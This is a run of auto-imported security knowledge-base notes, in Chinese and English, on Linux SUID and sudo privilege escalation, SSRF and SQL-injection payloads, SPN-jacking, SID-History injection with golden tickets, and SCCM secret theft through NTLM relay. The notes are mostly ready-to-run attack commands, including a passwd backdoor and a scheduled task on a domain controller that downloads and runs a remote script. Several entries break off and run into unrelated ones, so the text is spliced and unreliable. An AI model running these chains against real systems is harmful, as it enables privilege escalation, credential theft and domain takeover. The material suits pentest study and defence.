content: 来源路径： 02-知识点/域与Windows/SUID-SGID binaries 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SUID-SGID binaries 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 SUID-SGID binaries 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 SUID-SGID binaries 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：SUID/SGID binaries、Theory、Practice、Living of the land、Relative path calls；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SUID/SGID binaries Theory Practice Living of the land Relative path calls 二进制利用 # 核心要点 Vulnerable programs with these permissions are often targeted by attacker to obtain the user (for setuid) or group (for setgid) privileges. There are many techniques that attackers can use to hijack these binaries and obtain the associated rights. Using standard binaries features to 绕过 security restrictions is called Living off the Land 原生工具利用. If a SUID/SGID binary makes calls to programs using relative paths instead of absolute paths, attackers can try to make the binary run a program controlled by the attacker. Let's take this vulnerable program as an example : In the example above, the SUID/SGID binary calls the ls program using a relative path. An attacker can try to create a ls program somewhere he has write access to and edit the PATH environment variable so that his custom program is executed when running the SUID/SGID binary. When the vuln program will be executed, the malicious ls program will be called and a shell will be opened. In some cases, the binary that has SUID/SGID permissions can be reverse-engineered and attackers find ways to change the execution flow of that program to make it run something else. # 命令 / 载荷 / 操作片段 # 1. Practice 1234find $starting_path -perm -u=s -type f 2>/dev/null# Or in octal modefind $starting_path -perm -4000 -type f 2>/dev/null # 2. Relative path calls 12345int function(int argc, char *argv[]){/* ... */ system("ls") // instead of system("/usr/bin/ls")/* ... */} # 3. Relative path calls 1234mkdir -p /tmp/attackercd /tmp/attacker && printf '#!/bin/sh\nexec /bin/sh\n' > /tmp/attacker/lschmod +x /tmp/attacker/lsPATH=/tmp/attacker:$PATH ./vuln # 工具与参考入口 https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Linux 原生工具利用 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: SUDO 技术笔记
content: 来源路径： 02-知识点/域与Windows/SUDO 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SUDO 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 SUDO 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 SUDO 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：SUDO、Theory、Practice、Default configurations、Living off the Land 原生工具利用；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SUDO Theory Practice Default configurations Living off the Land 原生工具利用 CVE-2019-14287 (#-1) CVE-2021-3156 (Baron Samedit) # 核心要点 sudo (Super User DO) is a program for UNIX-like computer operating systems that allows users to run programs with the security privileges of another user (by default, the superuser). Sudo users are called sudoers ( 😯 I know right, big brains here 🧠 ). What sudoers are allowed to do is defined in the /etc/sudoers configuration file. This file, owned by root, is supposed to be 440 (read-only) and should only be edited with visudo, sudoedit or sudo -e. There are many ways to escalate privileges by exploiting sudo, either by profiting from insecure configuration, or by exploiting the program's vulnerabilities. For instance, this configuration allows the johnthesudoer user to run any privileged command as long as johnthesudoer's 密码 is known. A privileged session can be obtained with sudo -i, sudo -s, sudo su or sudo . While the SUDO configuration can be hardened to restrict privileged execution to specific program, there are some that can be abused to 绕过 local security restrictions. This is called Living off the Land 原生工具利用. The configuration above only allows sudoer johnthesudoer to execute /bin/tar as root as long as johnthesudoer's 密码 is known. The thing is tar is program that can be used to obtain a full session, hence bypassing the restrictions induced by sudoers configuration. # 命令 / 载荷 / 操作片段 # 1. Default configurations 123# Format isUser johnthesudoer may run the following commands on johncomputer: (ALL : ALL) ALL # 2. Living off the Land 原生工具利用 12User johnthesudoer may run the following commands on johncomputer: (ALL : ALL) /bin/tar # 3. Living off the Land 原生工具利用 1sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh # 4. Living off the Land 原生工具利用 1234cp /etc/passwd /tmp/passwd.bakecho "backdoorroot::0:0:Backdoor root:/root:/bin/bash" >> /tmp/passwd.baksudo /usr/bin/cp passwd.bak /etc/passwdsu -l backdoorroot # 5. CVE-2019-14287 (#-1) 12grep -e '(\s*ALL\s*,\s*!root\s*)' /etc/sudoersgrep -e '(\s*ALL\s*,\s*\!#0\s*)' /etc/sudoers # 6. CVE-2019-14287 (#-1) 123sudo -u#-1 sh -psudo -u#4294967295 sh -psudo -u#$((0xffffffff)) sh -p # 7. CVE-2021-3156 (Baron Samedit) 1sudoedit -s / # 8. CVE-2021-3156 (Baron Samedit) 123$ sudoedit -s /[sudo] password for user:sudoedit: /: not a regular file # 工具与参考入口 here this 利用 this one here here https://gtfobins.github.io/#+sudo https://jamesluo-843.medium.com/exploiting-cve-2019-14287-37eac7023a4 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Linux 原生工具利用 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/SSRF (Server-Side Request Forgery) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SSRF (Server-Side Request Forgery) 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 SSRF (Server-Side Request Forgery) 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 SSRF (Server-Side Request Forgery) 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：SSRF (Server-Side Request Forgery)、Theory、Practice、Bypassing filters、Pattern validation；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SSRF (Server-Side Request Forgery) Theory Practice Bypassing filters Pattern validation ORED (开放重定向) combination Blind SSRF vulnerabilities SSRF via SNI data from certificate SSRF with 命令注入 # 核心要点 A Server-Side Request Forgery (a.k.a. SSRF) is a web 漏洞 allowing attackers to make the server-side application do certain requests. This 漏洞 can lead to unauthorized actions, Sensitive Information Disclosure and even RCE (Remote Code Execution). With http://some.website/index.php?url=https://someother.website/index.php, and url being the vulnerable parameter, the following basic 载荷 can help a tester fetch content of files, scan ports, access filtered resources and so on. To scan for a specific range of private IP addresses (other than localhost), Use burp suite intruder that can fetch all of IP addresses in the internal network that is targeted. In order to conduct SSRF attacks properly, there may be use cases where filters need to be bypassed Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can 绕过 the filter using various techniques : In this context, a whitelist-based input filter can be used to restrict the types of URLs that a user can submit. For example, the filter might only allow URLs that match the whitelist pattern. In this situation, you can 绕过 the filter using various techniques : URL encode, even double URL encoding this special character to 绕过 the filter An extension to add to Burp Suite, called "collaborator everywhere", that adds non-invasive 载荷 into outgoing HTTP requests' headers in order to detect SSRF vulnerabilities if and when the target pingbacks to the collaborator endpoint. # 命令 / 载荷 / 操作片段 # 1. Practice 12345678file://PATH/TO/FILEhttp://127.0.0.1:80/adminhttp://127.0.0.1:80http://127.0.0.1:22ldap://127.0.0.1:389/%0astats%0aquitdict://{attacker_url}:11111/sftp://{attacker_url}:11111/tftp://{attacker_url}:12346/TESTUDPPACKET # 2. Bypassing filters 12345678http://127.1http://0http:@0/http://0.0.0.0:80http://[::]:80/http://[0000::1]:80/http://2130706433 # Decimal version of localhosthttp://0x7f000001/ # Hexadecimal version of localhost # 3. SSRF via SNI data from certificate 12345678stream { server { listen 443; resolver 127.0.0.11; proxy_pass $ssl_preread_server_name:443; ssl_preread on; }} # 4. content: 来源路径： 02-知识点/域与Windows/SQL 注入.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SQL 注入 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 SQL 注入 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 SQL 注入 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Practice、Vulnerable input 侦察、Manual testing、Extracting information with UNION；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 60 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Practice Vulnerable input 侦察 Manual testing Extracting information with UNION Automated tests 工具 Entry Point 检测 DBMS Identification DBMS Identification Keyword Based DBMS Identification Error Based 认证 绕过 Raw MD5 and SHA1 Hashed Passwords UNION Based Injection Error Based Injection Blind Injection Boolean Based Injection # 核心要点 Testers need to identify input vectors (parts of the app that accept content from the users) that could be used for database operations. For each identified vector, testers need to check if malicious strings and values successfully 利用 any 漏洞. Using special SQL characters (', ", #, ;,), *,%) in an input could lead to SQL errors sometimes echoed back to the users for debugging. This would indicate an entry point not sanitized enough and thus potentially vulnerable to SQL 注入. For every 载荷 do not forget to try url encoding or others. With some.website/?parameter=value some basic useful 载荷 to detect vulnerable inputs are: GET parameters are not the only ones that could be vulnerable to SQL 注入. Testers should thoroughly test all user inputs (parameters, user-agents, cookies...) The following 载荷 is used for testing SQL injections, XSS (跨站脚本 XSS) and SSTI (Server-Side Template Injection). sqlmapproject/sqlmap：Automatic SQL 注入 and database takeover tool r0oth3x49/ghauri：An advanced cross-platform tool that automates the process of detecting and exploiting SQL 注入 security flaws Detecting the entry point in SQL 注入 (SQL 注入) involves identifying locations in an application where user input is not properly sanitized before it is included in SQL queries. Error Messages: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL 注入 point. Tautology-Based SQL 注入: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering admin' OR '1'='1 in a username field might log you in as the admin if the system is vulnerable. Timing Attacks: Inputting SQL commands that cause deliberate delays (e.g., using SLEEP or BENCHMARK functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable. PayloadsAllTheThings/SQL 注入 / Intruder/Auth 绕过.txt Query the database for the user record (e.g., SELECT username, 密码 哈希 FROM users WHERE username = ?). Receive the stored 密码 哈希 from the DB. Locally compute 哈希 (input 密码) using whatever algorithm is configured. Compare stored 密码 哈希 == 哈希 (input 密码). Identify Injection Point and Confirm 漏洞 : Inject a 载荷 that evaluates to true/false to confirm SQL 注入 漏洞. For example: Example: Using json() function in SQLite to trigger an error as an oracle to know when the injection is true or false. MySQL is vulnerable by default. Similarly, the application of mathematical operations serves as an effective confirmation technique. For example, if accessing ?id=1 and ?id=2-1 produce the same result, it's indicative of SQL 注入. This word-list was created to try to confirm SQLinjections in the proposed way: # 命令 / 载荷 / 操作片段 # 1. Extracting information with UNION 1' UNION SELECT @@version, NULL -- # Inserting null depending on number of columns # 5. title: SPN-jacking 技术笔记
content: 来源路径： 02-知识点/域与Windows/SPN-jacking 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SPN-jacking 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 SPN-jacking 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 SPN-jacking 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：SPN-jacking、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SPN-jacking Theory Practice # 核心要点 On top of all that, if attacker is able to move a "listed SPN" from the original object to the another one, he could be able to compromise it. This is called SPN-jacking and it was intially discovered and explaine by Elad Shamir in this post. In order to "move the SPN", the attacker must have the right to edit the target object's ServicePrincipalName attribute (i.e. GenericAll, GenericWrite over the object orWriteProperty over the attribute (called WriteSPN since BloodHound 图分析 4.1), etc.). In this scenario, we assume the Kerberos 约束委派 is configured with protocol transition in order to keep things simple. However, the SPN-jacking attack can be conducted on KCD without protocol transition as well (cf. RBCD technique). attacker controls serverA, has at least WriteSPN over serverB (if needed, "live SPN-jacking"), and at least WriteSPN over serverC. From UNIX-like machines, krbrelayx's addspn.py and Impacket example scripts (Python) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets). Once the final service ticket is obtained, it can be used with Pass the Cache / 票据传递 to access the target. # 命令 / 载荷 / 操作片段 # 1. Practice 1234567891011121314# 1. show SPNs listed in the KCD configurationfindDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"# 2. remove SPN from ServerB if required (live SPN-jacking)addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'# 3. add SPN to serverCaddspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'# 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxygetST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:$PASSWORD'# 5. Edit the ticket's SPN (service class and/or hostname)tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC" # 2. Practice 1234567891011121314# 1. show SPNs listed in the KCD configurationGet-DomainObject -Identity ServerA$ -Properties 'msDS-AllowedToDelegateTo'# 2. remove SPN from ServerB if required (live SPN-jacking)Set-DomainObject -Identity ServerB$ -Clear 'ServicePrincipalName'# 3. add SPN to serverCSet-DomainObject -Identity ServerC$ -Set @{ServicePrincipalName='cifS/serverB'}# 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxyRubeus.exe s4u /nowrap /msdsspn:"cifs/serverB" /impersonateuser:"administrator" /domain:"$DOMAIN" /user:"$USER" /password:"$PASSWORD"# 5. Edit the ticket's SPN (service class and/or hostname)Rubeus.exe tgssub /nowrap /altservice:"host/serverC" /ticket:"ba64ticket" # 工具与参考入口 Elad Shamir this post since BloodHound 图分析 4.1 krbrelayx addspn.py Impacket the pull request The pull request PowerView Rubeus https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/SID-History Injection 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SID-History Injection 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 SID-History Injection 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 SID-History Injection 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：SID-History Injection、SID History Injection Attack、Diamond Ticket (Rubeus + KRBTGT-AES256)、黄金票据 (Mimikatz) with KRBTGT-AES256、From linux；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SID-History Injection SID History Injection Attack Diamond Ticket (Rubeus + KRBTGT-AES256) 黄金票据 (Mimikatz) with KRBTGT-AES256 From linux Manual with ticketer.py Automatic using raiseChild.py # 核心要点 Two methods exist for executing this attack: through the creation of either a 黄金票据 or a Diamond Ticket. Note that it's possible to disable SID history in a trust relationship which will make this attack fail. Check this post for more information about bypassing this: https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4 Last time I tried this I needed to add the arg /ldap. For more info about golden tickets check: For more info about diamond tickets check: Retrieves the 哈希 for the KRBTGT account in the child domain Creates a 黄金票据 Retrieves 凭据 for the Administrator account in the parent domain # 命令 / 载荷 / 操作片段 # 1. SID History Injection Attack 1Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid # 2. Diamond Ticket (Rubeus + KRBTGT-AES256) 12345678910111213# Use the /sids paramRubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap# Or a ptt with a golden ticket## The /ldap command will get the details from the LDAP (so you don't need to put the SID)## The /printcmd option will print the complete command if later you want to generate a token offlineRubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd#e.g.execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd# You can use "Administrator" as username or any other string # 3. 黄金票据 (Mimikatz) with KRBTGT-AES256 1234567891011121314mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"/user is the username to impersonate (could be anything)/domain is the current domain./sid is the current domain SID./sids is the SID of the target group to add ourselves to./aes256 is the AES256 key of the current domain's krbtgt account.--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option/startoffset sets the start time of the ticket to 10 mins before the current time./endin sets the expiry date for the ticket to 60 mins./renewmax sets how long the ticket can be valid for if renewed.# The previous command will generate a file called ticket.kirbi# Just loading you can perform a dcsync attack agains the domain # 4. 黄金票据 (Mimikatz) with KRBTGT-AES256 123.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbils \\mcorp-dc.moneycorp.local\c$ # 5. 黄金票据 (Mimikatz) with KRBTGT-AES256 123456789Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.localschtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114" # 6. Manual with ticketer.py 1234567891011121314151617# This is for an attack from child to root domain# Get child domain SIDlookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"# Get

title: SID History 技术笔记
content: 来源路径： 02-知识点/域与Windows/SID History 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SID History 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 SID History 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 SID History 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：SID History、Theory、Practice、Injecting SID History、Pre-Windows 2016；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SID History Theory Practice Injecting SID History Pre-Windows 2016 Post-Windows 2016 DSInternals method (default) DRSUAPI method (cross-forest, stealth) Auditing SID History # 核心要点 This mechanism can also be abused as a means of 持久化: adding the SID of a privileged account or group to the SID-History attribute of a controlled account grants rights associated with account/group of which the SID is added. Mimikatz must be launched with at least enough privileges to perform the privilege::debug command (i.e. domain admin or SYSTEM). The only known way to add a SID to the SID History attribute of an account on a Windows domain controller 2016 and above is to use the Powershell module DSInternals. This method also works for Pre-Windows 2016 domain controllers. Then, open a new PowerShell console: pySIDHistory (Python) enables remote SID History injection from Linux-based platforms, without requiring direct access to the domain controller. It supports two injection methods and multiple 认证 options. Stops NTDS, modifies ntds.dit offline via DSInternals, restarts NTDS. Works same-domain and can inject any SID including privileged ones (RID < 1000). # 命令 / 载荷 / 操作片段 # 1. Pre-Windows 2016 123456789# Generic commandmikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:UserRecievingTheSID /new:SIDOfTheTargetedUserOrGroup"# Example 1 : Use this command to inject the SID of built-in administrator account to the SID-History attribute of AttackerUsermikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:Builtin\administrators "# Example 2 : Use sid::lookup to retrieve the SID of an account and inject it to the SID-History attribute of AttackerUsermikikatz.exe "sid::lookup /name:InterestingUser"mikikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:AttackerUser /new:SIDOfInterestingUser" # 2. Post-Windows 2016 1234567# Install DSInternals on the domain controllerInstall-Module -Name DSInternals# Modify the file DSInternals.psd1notepad.exe (Join-Path (Get-InstalledModule -Name DSInternals | Select-Object -ExpandProperty InstalledLocation) 'DSInternals.psd1')# Then replace the line "# Intentionally excluded: 'Add-ADDBSidHistory'" with "'Add-ADDBSidHistory'" # 3. Post-Windows 2016 1234567891011# Find the account SID you want to injectGet-ADUser -Identity $InterestingUser# Stop the NTDS serviceStop-service NTDS -force# Inject the SID into the SID History attributeAdd-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit -Force# Start the NTDS serviceStart-service NTDS # 4. DSInternals method (default) 1234567891011# Same-domain: inject Domain Admins SIDpython3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \ --target $TARGET_USER --inject domain-admins --force# Cross-domain: inject DA from a foreign domainpython3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \ --target $TARGET_USER --inject domain-admins --inject-domain $FOREIGN_DOMAIN --force# Raw SID injectionpython3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \ --target $TARGET_USER --inject $SID --force # 5. DRSUAPI method (cross-forest, stealth) 1234python3 main.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP \ --target $TARGET_USER --method drsuapi \ --source-user $SRC_USER --source-domain $SRC_DOMAIN \ --src-username $SRC_USER --src-password $SRC_PASSWORD --src-domain $SRC_DOMAIN # 6. DRSUAPI method (cross-forest, stealth) 1234567# Pass-the-Hash authenticationpython3 main.py -d $DOMAIN -u $USER --ntlm-hash $NT_HASH --dc-ip $DC_IP \ --target $TARGET_USER --inject domain-admins --force# Kerberos authenticationpython3 main.py -d $DOMAIN -u $USER --kerberos --ccache $CCACHE --dc-ip $DC_IP \ --target $TARGET_USER --inject domain-admins --force # 7. Auditing SID History 1Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory -ne $null } # 8. Secrets such as OSDJoinAccount/OSDJoinPassword, NetworkAccessUsername / 密码，etc. are recovered without touching PXE or clients. TS Sequence – Task Sequence variables (OSDJoinAccount / 密码) If you already have PolicyID & PolicyVersion you can skip the clientID requirement using: These roles expose dozens of EXEC permissions, the key ones used in this attack are: Retrieve boot artifacts via TFTP: use the returned paths to 下载 variables.dat over TFTP (unauthenticated). The file is small (a few KB) and contains the encrypted media variables. If no key is provided (PXE media protected by a custom 密码), SharpPXE emits a Hashcat-compatible sccmsccmsccmaes128$... 哈希 for offline cracking. After recovering the 密码，decrypt the file. Requirements: only network reachability to the PXE listener (UDP/4011) and TFTP; no local admin privileges are needed. NTLM 中继 fundamentals: MSSQL abuse & post - 利用: # 命令 / 载荷 / 操作片段 # 1. Enumerating unauthenticated MP endpoints 1curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format - # 2. Relay the MP machine account to MSSQL 123456# 1. Start the relay listener (SMB→TDS)ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support# 2. Trigger authentication from the MP (PetitPotam example)python3 PetitPotam.py 10.10.10.20 10.10.10.99 \ -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10 # 3. Relay the MP machine account to MSSQL 12[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433) # 4. Identify OSD policies via stored procedures 1proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth # 5. 3.1 Find Unknown-Computer GUIDs (optional) 1234USE CM_001;SELECT SMS_Unique_Identifier0FROM dbo.UnknownSystem_DISCWHERE DiscArchKey = 2; -- 2 = x64, 0 = x86 # 6. 3.2 List assigned policies 1EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''; # 7. 3.3 Retrieve full body 1EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00'; # 8. Decode & decrypt the blob 12345# Remove the UTF-16 BOM, convert from hex → XMLecho 'fffe3c003f0078…' | xxd -r -p > policy.xml# Decrypt with PXEthief (7 = decrypt attribute value)python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml) # 9. Decode & decrypt the blob 1234OSDJoinAccount : CONTOSO\\joinerOSDJoinPassword: SuperSecret2025!NetworkAccessUsername: CONTOSO\\SCCM_NAANetworkAccessPassword: P4ssw0rd123 # 10. Relevant SQL roles & procedures 123456SELECT pr.nameFROM sys.database_principals AS dpJOIN sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_idJOIN sys.objects AS pr ON pr.object_id = pe.major_idWHERE dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc') AND pe.permission_name='EXECUTE'; # 工具与参考入口 I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays PXEthief Misconfiguration Manager – ELEVATE-4 & ELEVATE-5 SharpPXE # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 SQL 注入 Active Directory 攻击链 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

